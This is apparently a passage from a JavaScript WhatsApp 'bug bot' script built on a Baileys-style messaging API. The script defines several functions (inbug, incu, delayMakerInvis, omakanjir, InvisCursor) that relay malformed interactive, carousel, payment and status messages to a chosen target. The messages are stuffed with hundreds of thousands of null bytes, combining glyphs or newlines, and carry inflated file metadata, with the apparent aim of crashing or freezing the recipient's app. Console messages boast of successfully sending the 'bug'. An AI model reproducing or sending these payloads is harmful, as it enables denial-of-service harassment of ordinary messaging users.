⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉\n " + "ꦽ".repeat(300000);
    await sock.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "NtahMengapa..",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function inbug(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: 'Zyro Owner Xtry',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "Zyro Owner Xtry"
                },
                footer: {
                  text: "Xtry.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ Xtry.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}
async function delayMakerInvis(target) {
  return sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              isForwarded: true,
              forwardingScore: 1,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363321780343299@newsletter",
                newsletterName: "Ranzz Coldd",
                serverMessageId: 1,
              },
              remoteJid: "status@broadcast",
              participant: target,
              quotedMessage: {
                interactiveResponseMessage: {
                  body: {
                    format: 1,
                    text: `ranz`,
                  },
                  nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: `{"screen_1_TextArea_0":"hshsjs","screen_0_TextInput_0":"hallo@gmail.com","screen_0_TextInput_1":"bshs${"\u0000".repeat(
                      510000,
                    )}","screen_0_Dropdown_1":"0_1_-_5","screen_0_CheckboxGroup_2":["0_دعم_العملاء_عبر_واتساب","1_زيادة_المبيعات_باستخدام_واتساب","3_العلامة_الخضراء","2_عقد_شراكة_\\/_أصبح_موزع","4_حظر\\/إيقاف_الحساب","5_شيء_آخر${"\u0000".repeat(
                      510000,
                    )}"],"flow_token":"1:841635371047356:9e9405db7c74caaf750d7f2eebef22fb"}`,
                    version: 3,
                  },
                },
              },
            },
            body: {
              text: "*⺞ 𝙒𝙃𝙀𝙍𝙀 𝙄𝙎 𝙎𝙄𝘽𝘼𝙔?*",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "galaxy_message",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonsParamsJson: "",
                },
              ],
            },
          },
        },
      },
    },
    { participant: { jid: target } },
  );
}

async function incu(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '@𝗿𝗮𝗹𝗱𝘇𝘇𝘅𝘆𝘇 • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "\u0000".repeat(510000)
                },
                footer: {
                  text: "\u0000".repeat(510000)
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: `{"screen_1_TextArea_0":"hshsjs","screen_0_TextInput_0":"hallo@gmail.com","screen_0_TextInput_1":"bshs${"\u0000".repeat(
                      510000,
                    )}","screen_0_Dropdown_1":"0_1_-_5","screen_0_CheckboxGroup_2":["0_دعم_العملاء_عبر_واتساب","1_زيادة_المبيعات_باستخدام_واتساب","3_العلامة_الخضراء","2_عقد_شراكة_\\/_أصبح_موزع","4_حظر\\/إيقاف_الحساب","5_شيء_آخر${"\u0000".repeat(
                      510000,
                    )}"],"flow_token":"1:841635371047356:9e9405db7c74caaf750d7f2eebef22fb"}`,
                    version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  console.log(chalk.green(`Successfully Send ${chalk.red("CursorCrl")} to ${target}`))
}
async function omakanjir(target, mention) {
console.log(chalk.green("Menjalankan Invisible Bug"));
    await sock.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "imvier bang",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "payment_transaction_request",
                        paramsJson: "\u0003".repeat(9000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target }});
}
async function InvisCursor(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '⛧ 尺izxᐯelz 𐍈fficial-Iᗪ ⛧',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO/